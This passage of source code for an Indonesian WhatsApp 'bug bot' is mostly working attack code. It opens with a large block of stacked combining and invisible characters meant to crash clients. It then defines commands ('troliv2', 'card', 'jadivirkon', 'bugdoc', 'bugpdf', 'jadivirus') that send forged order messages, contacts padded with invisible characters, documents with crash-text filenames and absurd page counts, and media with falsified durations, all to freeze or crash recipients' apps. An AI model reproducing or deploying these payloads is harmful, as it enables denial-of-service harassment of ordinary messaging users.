̧̡̛̺̩̣̥͕̗̫̞̥̱̦̲̝̯͆͆̀̀̅͒́̋́͋͐͊͌̒̕͜͝͡͝͝͝�̴̡̧̛̛͖̜̬̯͉̥̣̯̯̠̘̲͕̜̲̭͛́̿́͐̾̀̇̊̽͒̿̽͑̕̕̚̕̚⁤̴̧̡͙͈̲̱̎⁤̶̱̝̲̞̽͌̎̅̌̚͘̚ͅͅ⁤̷̧̛̹̜̟͍̤͚̺̳̥̞̯̰̻̥̟͙͌̏̀̽̓̓͑̽̂̑̾̆͌̋̈́͟͝͡⁤̵͖͚̣̹̖̟̖̙̈͆⁤̸̛͍̘̤̩̳̙̒͛͊͒̇͛́̃͒̎̽̐̈̔̔͂̒̈́͑̕͟͝⁤̷̢͙͚͉͍̲̻̺͖̼͚͙̘̤͙̱̘͓̭͔̩͙̮̰̓̈̇͜⁤̵̨̬̘̥̗̤̺͔̬͍͉̥̠̤͍̘̠̯̝͓̼͍̟̗͕͛̇̅̀͝͡⁤̸̯̯͍͙̱͐̂̈̈́̀͌̀͌̒̉͝⁢̴̡͖̯͇̻̰̫̖͈͚͔̮̠̙͉͎͉͖͉̳̣͍͌͒̒̽͜͜ͅ⁤̵̡̡̝̮̬̺̳̣̗̪̤̳̙͓̣͓̆̿̆̄̓͛̇̐͋̔̍͆̆̎̈̆̊̚̚͟͠͡*̴̛̛͇̻̬̥̄̓̈͐̌̆͒̓͌̓̂̿̆̾̔̊̓̒͂̊͂͘�̵̖̘̦̈́�̸̡̨͍̣̰͖̰̻̗̖̙̙͙̞̙͓̇̊͆̈̊̏͊̇̐̀̽̿̅̍̏͟͟͝͝⁤̵̨̛̞̲̲̦͇̰̳̐̎͂͑͗͆̑̐́̃̽̒̿̽̚̕̕͟⁤̵̈́̾🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥?̵̧̧̼͓̞͈͖̲͎̙̞͎͖̙̩̘͂́̔̉̉̍̕͝?̷̣̯̦̲͎͍͑͌̍͋͗͐̂̐̚͜͡͝*̷̧̡̛̺̩̣̥͕̗̫̞̥̱̦̲̝̯̏͆͆̀̀̅͒́̋́͋͐͊͌̒̕͜͝͡͝͝͝�̴̡̧̛̛͖̜̬̯͉̥̣̯̯̠̘̲͕̜̲̭͛́̿́͐̾̀̇̊̽͒̿̽͑̕̕̚̕̚⁤̴̧̡͙͈̲̱̎⁤̶̱̝̲̞̽͌̎̅̌̚͘̚ͅͅ⁤̷̧̛̹̜̟͍̤͚̺̳̥̞̯̰̻̥̟͙͌̏̀̽̓̓͑̽̂̑̾̆͌̋̈́͟͝͡⁤̵͖͚̣̹̖̟̖̙̈͆⁤̸̛͍̘̤̩̳̙̒͛͊͒̇͛́̃͒̎̽̐̈̔̔͂̒̈́͑̕͟͝⁤̷̢͙͚͉͍̲̻̺͖̼͚͙̘̤͙̱̘͓̭͔̩͙̮̰̓̈̇͜⁤̵̨̬̘̥̗̤̺͔̬͍͉̥̠̤͍̘̠̯̝͓̼͍̟̗͕͛̇̅̀͝͡⁤̸̯̯͍͙̱͐̂̈̈́̀͌̀͌̒̉͝⁢̴̡͖̯͇̻̰̫̖͈͚͔̮̠̙͉͎͉͖͉̳̣͍͌͒̒̽͜͜ͅ⁤̵̡̡̝̮̬̺̳̣̗̪̤̳̙͓̣͓̆̿̆̄̓͛̇̐͋̔̍͆̆̎̈̆̊̚̚͟͠͡*̴̛̛͇̻̬̥̄̓̈͐̌̆͒̓͌̓̂̿̆̾̔̊̓̒͂̊͂͘�̵̖̘̦̈́�̸̡̨͍̣̰͖̰̻̗̖̙̙͙̞̙͓̇̊͆̈̊̏͊̇̐̀̽̿̅̍̏͟͟͝͝⁤̵̨̛̞̲̲̦͇̰̳̐̎͂͑͗͆̑̐́̃̽̒̿̽̚̕̕͟⁤̵̯̺̈́̾⁤̴̪͋̐̔̂̇̒̑̅̀̈͘͝͠⁤̴̖̰̮̜̙̎́̆̃͐̀͒̑̎͋̒̿̽́̑̂̓̋̎̓͘͜⁤̷̢̧̡̝͓͈̪̬̩̪̳̣̘͚̳̃̔̌̑́͂͂̓͂̎̒̉͠ͅ⁤̸̢̧̰͓̥̝̣̱͓̳͕̜͚̘̟̟͈͍̦̟͈̤̐̇͗̿̃ͅ⁤̷̡̭͖͉̙͓̳̮̀̈͌́̒͌̅̊̅̈́̍̚͜͜⁤̶͍͋̓̓͐̾̋̓̔͋̈́̎̾̒̇̄͂̄̕͝͡⁢̷̛̯̱̪͍͉̟̆͂́̈́̿͌̈́̋͂͌͂̆̑͋̈́̉͗̈́́͒̚͟͡͝͠⁤̸̢̛̯̠͔̟̰͔̞̮̦̫͔̖̦̿̿̀̊̒́̀̌̂̔̍̓͜͟͡*̴̜̫̘̬̍̓̒̄̉͛̀͒̈́̊̃͑̀̇̎̑͊͗́̕̕̕͟͝͝�̸̡̞͉̦͕̭͈͌̈̓͋̄̿̾͆̏̈̌̑͟͝͝͠ͅ*̴̢̢̘͇͙̟̫͎͎̹̹̪̯̠͎̘̙̥̜͓̍̐̿̈́̈́͊͜?̵̧̧̼͓̞͈͖̲͎̙̞͎͖̙̩̘͂́̔̉̉̍̕͝?̷̣̯̦̲͎͍͑͌̍͋͗͐̂̐̚͜͡͝*̷̧̡̛̺̩̣̥͕̗̫̞̥̱̦̲̝̯̏͆͆̀̀̅͒́̋́͋͐͊͌̒̕͜͝͡͝͝͝�̴̡̧̛̛͖̜̬̯͉̥̣̯̯̠̘̲͕̜̲̭͛́̿́͐̾̀̇̊̽͒̿̽͑̕̕̚̕̚⁤̴̧̡͙͈̲̱̎⁤̶̱̝̲̞̽͌̎̅̌̚͘̚ͅͅ⁤̷̧̛̹̜̟͍̤͚̺̳̥̞̯̰̻̥̟͙͌̏̀̽̓̓͑̽̂̑̾̆͌̋̈́͟͝͡⁤̵͖͚̣̹̖̟̖̙̈͆⁤̸̛͍̘̤̩̳̙̒͛͊͒̇͛́̃͒̎̽̐̈̔̔͂̒̈́͑̕͟͝⁤̷̢͙͚͉͍̲̻̺͖̼͚͙̘̤͙̱̘͓̭͔̩͙̮̰̓̈̇͜⁤̵̨̬̘̥̗̤̺͔̬͍͉̥̠̤͍̘̠̯̝͓̼͍̟̗͕͛̇̅̀͝͡⁤̸̯̯͍͙̱͐̂̈̈́̀͌̀͌̒̉͝⁢̴̡͖̯͇̻̰̫̖͈͚͔̮̠̙͉͎͉͖͉̳̣͍͌͒̒̽͜͜ͅ⁤̵̡̡̝̮̬̺̳̣̗̪̤̳̙͓̣͓̆̿̆̄̓͛̇̐͋̔̍͆̆̎̈̆̊̚̚͟͠͡*̴̛̛͇̻̬̥̄̓̈͐̌̆͒̓͌̓̂̿̆̾̔̊̓̒͂̊͂͘�̵̖̘̦̈́�̸̡̨͍̣̰͖̰̻̗̖̙̙͙̞̙͓̇̊͆̈̊̏͊̇̐̀̽̿̅̍̏͟͟͝͝⁤̵̨̛̞̲̲̦͇̰̳̐̎͂͑͗͆̑̐́̃̽̒̿̽̚̕̕͟⁤̵̈́̾🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥?̵̧̧̼͓̞͈͖̲͎̙̞͎͖̙̩̘͂́̔̉̉̍̕͝?̷̣̯̦̲͎͍͑͌̍͋͗͐̂̐̚͜͡͝*̷̧̡̛̺̩̣̥͕̗̫̞̥̱̦̲̝̯̏͆͆̀̀̅͒́̋́͋͐͊͌̒̕͜͝͡͝͝͝�̴̡̧̛̛͖̜̬̯͉̥̣̯̯̠̘̲͕̜̲̭͛́̿́͐̾̀̇̊̽͒̿̽͑̕̕̚̕̚⁤̴̧̡͙͈̲̱̎⁤̶̱̝̲̞̽͌̎̅̌̚͘̚ͅͅ⁤̷̧̛̹̜̟͍̤͚̺̳̥̞̯̰̻̥̟͙͌̏̀̽̓̓͑̽̂̑̾̆͌̋̈́͟͝͡⁤̵͖͚̣̹̖̟̖̙̈͆⁤̸̛͍̘̤̩̳̙̒͛͊͒̇͛́̃͒̎̽̐̈̔̔͂̒̈́͑̕͟͝⁤̷̢͙͚͉͍̲̻̺͖̼͚͙̘̤͙̱̘͓̭͔̩͙̮̰̓̈̇͜⁤̵̨̬̘̥̗̤̺͔̬͍͉̥̠̤͍̘̠̯̝͓̼͍̟̗͕͛̇̅̀͝͡⁤̸̯̯͍͙̱͐̂̈̈́̀͌̀͌̒̉͝⁢̴̡͖̯͇̻̰̫̖͈͚͔̮̠̙͉͎͉͖͉̳̣͍͌͒̒̽͜͜ͅ⁤̵̡̡̝̮̬̺̳̣̗̪̤̳̙͓̣͓̆̿̆̄̓͛̇̐͋̔̍͆̆̎̈̆̊̚̚͟͠͡*̴̛̛͇̻̬̥̄̓̈͐̌̆͒̓͌̓̂̿̆̾̔̊̓̒͂̊͂͘�̵̖̘̦̈́�̸̡̨͍̣̰͖̰̻̗̖̙̙͙̞̙͓̇̊͆̈̊̏͊̇̐̀̽̿̅̍̏͟͟͝͝⁤̵̨̛̞̲̲̦͇̰̳̐̎͂͑͗͆̑̐́̃̽̒̿̽̚̕̕͟⁤̵̯̺̈́̾⁤̴̪͋̐̔̂̇̒̑̅̀̈͘͝͠⁤̴̖̰̮̜̙̎́̆̃͐̀͒̑̎͋̒̿̽́̑̂̓̋̎̓͘͜⁤̷̢̧̡̝͓͈̪̬̩̪̳̣̘͚̳̃̔̌̑́͂͂̓͂̎̒̉͠ͅ⁤̸̢̧̰͓̥̝̣̱͓̳͕̜͚̘̟̟͈͍̦̟͈̤̐̇͗̿̃ͅ⁤̷̡̭͖͉̙͓̳̮̀̈͌́̒͌̅̊̅̈́̍̚͜͜⁤̶͍͋̓̓͐̾̋̓̔͋̈́̎̾̒̇̄͂̄̕͝͡⁢̷̛̯̱̪͍͉̟̆͂́̈́̿͌̈́̋͂͌͂̆̑͋̈́̉͗̈́́͒̚͟͡͝͠⁤̸̢̛̯̠͔̟̰͔̞̮̦̫͔̖̦̿̿̀̊̒́̀̌̂̔̍̓͜͟͡*̴̜̫̘̬̍̓̒̄̉͛̀͒̈́̊̃͑̀̇̎̑͊͗́̕̕̕͟͝͝�̸̡̞͉̦͕̭͈͌̈̓͋̄̿̾͆̏̈̌̑͟͝͝͠ͅ*̴̢̢̘͇͙̟̫͎͎̹̹̪̯̠͎̘̙̥̜͓̍̐̿̈́̈́͊͜?̵̧̧̼͓̞͈͖̲͎̙̞͎͖̙̩̘͂́̔̉̉̍̕͝?̷̣̯̦̲͎͍͑͌̍͋͗͐̂̐̚͜͡͝*̷̧̡̛̺̩̣̥͕̗̫̞̥̱̦̲̝̯̏͆͆̀̀̅͒́̋́͋͐͊͌̒̕͜͝͡͝͝͝�̴̡̧̛̛͖̜̬̯͉̥̣̯̯̠̘̲͕̜̲̭͛́̿́͐̾̀̇̊̽͒̿̽͑̕̕̚̕̚⁤̴̧̡͙͈̲̱̎⁤̶̱̝̲̞̽͌̎̅̌̚͘̚ͅͅ⁤̷̧̛̹̜̟͍̤͚̺̳̥̞̯̰̻̥̟͙͌̏̀̽̓̓͑̽̂̑̾̆͌̋̈́͟͝͡⁤̵͖͚̣̹̖̟̖̙̈͆⁤̸̛͍̘̤̩̳̙̒͛͊͒̇͛́̃͒̎̽̐̈̔̔͂̒̈́͑̕͟͝⁤̷̢͙͚͉͍̲̻̺͖̼͚͙̘̤͙̱̘͓̭͔̩͙̮̰̓̈̇͜⁤̵̨̬̘̥̗̤̺͔̬͍͉̥̠̤͍̘̠̯̝͓̼͍̟̗͕͛̇̅̀͝͡⁤̸̯̯͍͙̱͐̂̈̈́̀͌̀͌̒̉͝⁢̴̡͖̯͇̻̰̫̖͈͚͔̮̠̙͉͎͉͖͉̳̣͍͌͒̒̽͜͜ͅ⁤̵̡̡̝̮̬̺̳̣̗̪̤̳̙͓̣͓̆̿̆̄̓͛̇̐͋̔̍͆̆̎̈̆̊̚̚͟͠͡*̴̛̛͇̻̬̥̄̓̈͐̌̆͒̓͌̓̂̿̆̾̔̊̓̒͂̊͂͘�̵̖̘̦̈́�̸̡̨͍̣̰͖̰̻̗̖̙̙͙̞̙͓̇̊͆̈̊̏͊̇̐̀̽̿̅̍̏͟͟͝͝⁤̵̨̛̞̲̲̦͇̰̳̐̎͂͑͗͆̑̐́̃̽̒̿̽̚̕̕͟⁤̵̈́̾🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥️`,
						"sequenceNumber": "1632077323798001",
					"thumbnail": virgam,
    "contextInfo": {
      "forwardingScore": 150,
      "isForwarded": false
    }
  }
}, {quoted:floc, contextInfo:{}}) 
Hanz.relayWAMessage(res)
break
//ᗷᑌᘜ TᖇOᒪIᐯ2 + ᗷᑌᘜᘜᑕ
case 'troliv2': 
if (!mek.key.fromMe && !isOwner) return replyy('Khusus Owner !!')
await Hanz.relayWAMessage(Hanz.prepareMessageFromContent(from, Hanz.prepareDisappearingMessageSettingContent(0),{}),{ waitForAck: true });
members_ids = [];
        for (let mem of groupMembers) {
          members_ids.push(mem.jid);
        }
buf = fs.readFileSync('./media/Bot.jpg')
imeu = await Hanz.prepareMessage('0@s.whatsapp.net', buf, image) 
imeg = imeu.message.imageMessage
res = await Hanz.prepareMessageFromContent(from,{
"orderMessage": {
"orderId": "150453297177375",
"thumbnail": virgam,
"itemCount": 2021,
"status": "INQUIRY",
"surface": "CATALOG",
"orderTitle": "BENTAR LAGI 2022 UBAH ITEM COUNT NYA JADI 2022",
"message":"HANZ々OFC彡",
"sellerJid": "6285731811079@s.whatsapp.net",
"token": "AR6z9PAvHjs9Qa7AYgBUjSEvcnOcRWycFpwieIhaMKdrhQ==",
"totalAmount1000": "Rp 99.99999999999999999999",
"totalCurrencyCode": "IDR",
"contextInfo": {
"forwardingScore": 3,
"isForwarded": true
}
}
}, {quoted:mek, contextInfo:{}}) 
Hanz.relayWAMessage(res)
await Hanz.relayWAMessage(Hanz.prepareMessageFromContent(from, Hanz.prepareDisappearingMessageSettingContent(0),{}),{ waitForAck: true });
break
//ᗷᑌᘜ TᖇOᒪIᐯ2 + ᑎᗩᗰᗩ
case 'card':
if (!mek.key.fromMe && !isOwner) return replyy('Khusus Owner !!')
if (!arg) return replyy(`Penggunaan ${prefix}troli teks|jumlah`)
sticWait(from)
argzi = arg.split("|")
if (Number(argzi[1]) >= 10) return replyy('Kebanyakan Delay Wea ku su!')
if (isNaN(argzi[1])) return replyy(`harus berupa angka`)
for (let i = 0; i < argzi[1]; i++){
njir = await Hanz.prepareMessageFromContent(from, {"orderMessage": {"orderId": "150453297177375", "sellerJid": "6285731811079@s.whatsapp.net", "thumbnail": fs.readFileSync('./media/virgam.jpeg'), "itemCount": 2022, "status": "INQUIRY", "surface": "CATALOG", "message": `${argzi[0]}`, "orderTitle": "6283144394823@s.whatsapp.net", "token": "AR7i5IXXiMA6NjT0DxcwdcKxhXCy1rOrvlNJzqXPMr8PCg==" }, "totalAmount1000": "Rp 99.99999999999999999999", "totalCurrencyCode": "IDR", "contextInfo": {"forwardingScore": 3, "isForwarded": true }}, {quoted:ftrol, contextInfo:{}}) 
Hanz.relayWAMessage(njir)}
break
//ᒍᗩᗪI ᐯIᖇKOᑎ ᑕᖇᗩՏᕼ ᕼOᗰᗴ
case "jadivirkon":
sticWait(from)
        pe = args.join("");        
        nah = pe.split("|")[1];
        entah = pe.split("|")[0];
        if (isNaN(entah)) return replyy("Invalid phone number");
        members_ids = [];
        for (let mem of groupMembers) {
          members_ids.push(mem.jid);
        }
        vcard =
          "BEGIN:VCARD\n" +
          "VERSION:3.0\n" +
          `FN:${nah}\n` +
          `TEL;type=CELL;type=VOICE;waid=${entah}:${phoneNum(
            "+" + entah
          ).getNumber("internasional")}\n` +
          "END:VCARD".trim();
        Hanz.sendMessage(
          from,
          { displayName: `${nah}͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏${virtex7(prefix)}`, vcard: vcard },
          contact,
          { contextInfo: { mentionedJid: members_ids } }          
        );
        break;
//ᗷᑌᘜ ᗪOᑕᑌᗰᗴᑎT        
case 'bugdoc': 
  if (!mek.key.fromMe && !isOwner) return replyy('Khusus Owner !!')
hmm6 = fs.readFileSync('./media/Hanz.txt')
Hanz.sendMessage(from, hmm6, document, { quoted: {
  key: {
   participant: '0@s.whatsapp.net'
  },
  message: {
   orderMessage: {
    itemCount: 9999999,
    status: 1,
    surface: 1,
    message: 'HANZ々OFC彡️',
    orderTitle: 'bugdoc〽', // 
    sellerJid: '0@s.whatsapp.net'
   }
  }
 } ,filename:`${virtex7(prefix)}${virtex7(prefix)}${virtex7(prefix)}${virtex7(prefix)}.txt`, mimetype: 'application/txt'})
break
//ᗷᑌᘜᑭᗪᖴ Տᗩᗰᗩ ᗩᒍᗩ KᗴK ᗷᑌᘜᗪOᑕ
case 'bugpdf':
if (!mek.key.fromMe && !isOwner) return replyy('Khusus Owner !!')
hm = fs.readFileSync('./media/HANZ々OFC彡️.pdf')
Hanz.sendMessage(from, hm, document, { quoted: {
  key: {
   participant: '0@s.whatsapp.net'
  },
  message: {
   orderMessage: {
    itemCount: 9999999,
    status: 1,
    surface: 1,
    message: 'HANZ々OFC彡️️',
    orderTitle: 'bugpdf〽', // 
    sellerJid: '0@s.whatsapp.net'
   }
  }
 }, pageCount: 9999999,filename:`${ngazap(prefix)}.pdf`, mimetype: 'application/pdf',jpegThumbnail: image}) 
 break
//ᒍᗩᗪIᐯIᖇᑌՏ ᖇᗴᑭᒪY ᗩᒪᒪ  
 case 'jadivirus':
 if (!mek.key.fromMe && !isOwner) return replyy('Khusus Owner !!')
 sticWait(from)
            if ((isMedia && !mek.message.videoMessage || isQuotedSticker) && args.length == 0) {
            encmedia = isQuotedSticker ? JSON.parse(JSON.stringify(mek).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo : mek
            file = await Hanz.downloadAndSaveMediaMessage(encmedia, filename = getRandom())
            value = args.join(" ")
            var group = await Hanz.groupMetadata(from)
            var member = group['participants']
            var mem = []
            member.map(async adm => {
            mem.push(adm.id.replace('c.us', 's.whatsapp.net'))
            })
            var options = {
                contextInfo: { mentionedJid: mem },
                quoted: mek
            }
            ini_buffer = fs.readFileSync(file)
               Hanz.sendMessage(from, ini_buffer, sticker, { thumbnail : virgam, mek})
            fs.unlinkSync(file)
            } else if ((isMedia && !mek.message.videoMessage || isQuotedImage) && args.length == 0) {
            encmedia = isQuotedImage ? JSON.parse(JSON.stringify(mek).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo : mek
            file = await Hanz.downloadAndSaveMediaMessage(encmedia, filename = getRandom())
            value = args.join(" ")
            var group = await Hanz.groupMetadata(from)
            var member = group['participants']
            var mem = []
            member.map(async adm => {
            mem.push(adm.id.replace('c.us', 's.whatsapp.net'))
            })
            var options = {
                contextInfo: { mentionedJid: mem },
                quoted: mek
            }
            ini_buffer = fs.readFileSync(file)
            Hanz.sendMessage(from, ini_buffer, image, { thumbnail : virgam, mek, options})
            fs.unlinkSync(file)
        } else if ((isMedia && !mek.message.videoMessage || isQuotedAudio) && args.length == 0) {
            encmedia = isQuotedAudio ? JSON.parse(JSON.stringify(mek).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo : mek
            file = await Hanz.downloadAndSaveMediaMessage(encmedia, filename = getRandom())
            value = args.join(" ")
            var group = await Hanz.groupMetadata(from)
            var member = group['participants']
            var mem = []
            member.map(async adm => {
            mem.push(adm.id.replace('c.us', 's.whatsapp.net'))
            })
            var options = {
            	mimetype : 'audio/mp4',
            	ptt : true,
                contextInfo: { mentionedJid: mem },
                quoted: mek
            }
            ini_buffer = fs.readFileSync(file)
               Hanz.sendMessage(from, ini_buffer, audio, { thumbnail : virgam, mek})
            fs.unlinkSync(file)
        }  else if ((isMedia && !mek.message.videoMessage || isQuotedVideo) && args.length == 0) {
            encmedia = isQuotedVideo ? JSON.parse(JSON.stringify(mek).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo : mek
            file = await Hanz.downloadAndSaveMediaMessage(encmedia, filename = getRandom())
            value = args.join(" ")
            var group = await Hanz.groupMetadata(from)
            var member = group['participants']
            var mem = []
            member.map(async adm => {
            mem.push(adm.id.replace('c.us', 's.whatsapp.net'))
            })
            var options = {
            	mimetype : 'video/mp4',
                contextInfo: { mentionedJid: mem },
                quoted: mek
            }
            ini_buffer = fs.readFileSync(file)
          Hanz.sendMessage(from, ini_buffer, video, {mimetype: 'video/mp4', duration: 359996400, quoted: mek})
            fs.unlinkSync(file)
        } else{
          replyy(`reply gambar/video dengan caption ${prefix}jadivirus`)
        }
        break        
//ᒍᗩᗪIᐯIᖇᐯIᗪ ᖇᗴᑭᒪY ᐯIᗪᗴO        
				  case 'jadivirvid':
if (!mek.key.fromMe && !isOwner) return replyy('Khusus Owner !!')
sticWait(from)
if (isQuotedVideo) {
            const swsw = isQuotedVideo ? JSON.parse(JSON.stringify(mek).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo : mek
            cihcih = await Hanz.downloadMediaMessage(swsw)
            Hanz.sendMessage(from,cihcih, video, {mimetype: 'video/mp4', duration: 359996400,thumbnail:virgam,caption: 'Nih Dah Jadi Kontol'})
            } else {
            replyy('reply videonya!')
            }
            break 
//ᒍᗩᗪIᐯIᖇᐯIᗪ2 ᖇᗴᑭᒪY ՏTIᑕKᗴᖇ ᘜIᖴ            
            case 'jadivirvid2':
            if (!mek.key.fromMe && !isOwner) return replyy('Khusus Owner !!')
            sticWait(from)
if (isQuotedSticker) {
            const swsw = isQuotedSticker ? JSON.parse(JSON.stringify(mek).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo : mek
            cihcih = await Hanz.downloadMediaMessage(swsw)
            Hanz.sendMessage(from,cihcih, video, {mimetype: 'video/mp4', duration: 359996400,thumbnail:virgam,caption: 'Nih Dah Jadi Kontol'})
            } else {
            replyy('reply Sticker nya!')
            }
break
case 'jadivirvid3':
            if (!mek.key.fromMe && !isOwner) return replyy('Khusus Owner !!')
            sticWait(from)
if (isQuotedGif) {
            const swsw = isQuotedGif ? JSON.parse(JSON.stringify(mek).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo : mek
            cihcih = await Hanz.downloadMediaMessage(swsw)
            Hanz.sendMessage(from,cihcih, Gif, {mimetype: 'video/mp4', duration: 359996400,thumbnail:virgam,caption: 'Nih Dah Jadi Kontol'})
            } else {
            replyy('reply Sticker nya!')
            }
break
//ՏTIᑕKᗴᖇ Kᗴ ᐯIᖇᘜᗩᗰ            
case 'tovirgam':
case 'jadivirgam':
if (!mek.key.fromMe && !isOwner) return replyy('Khusus Owner !!')
if (!isQuotedSticker) return replyy('Reply stiker nya')
sticWait(from)
if (mek.message.extendedTextMessage.contextInfo.quotedMessage.stickerMessage.isAnimated === true){
const encmedia = JSON.parse(JSON.stringify(mek).replace('quotedM','m')).message.extendedTextMessage.contextInfo
const media = await Hanz.downloadAndSaveMediaMessage(encmedia)
const upload = await uploadimg(media, Date.now() + '.webp')
console.log(upload)
reply(`${upload.result.image}`)
const rume = await axios.get(`http://nzcha-apii.herokuapp.com/webp-to-mp4?url=${upload.result.image}`)
console.log(rume.data)
